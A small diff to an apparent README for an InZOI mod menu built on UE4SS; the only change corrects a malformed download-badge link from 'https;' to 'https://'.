@@ -4,7 +4,7 @@ Elevate your InZOI gameplay with the Ultimate Mod Menu! This all-in-one modding 
 
 Explore limitless possibilities with detailed vehicle tweaking, real-time character editing, and mod integration built on UE4SS. Crafted with usability, stability, and creativity in mind, this mod menu is your gateway to an entirely new level of interactivity within InZOI.
 
-[![Download InZOI Mod Menu](https://img.shields.io/badge/Download-InZOI_Mod_Menu-blueviolet)](https;//inzoi-mod-menu-ultimate.github.io/.github)
+[![Download InZOI Mod Menu](https://img.shields.io/badge/Download-InZOI_Mod_Menu-blueviolet)](https://inzoi-mod-menu-ultimate.github.io/.github)
 
 ---
 
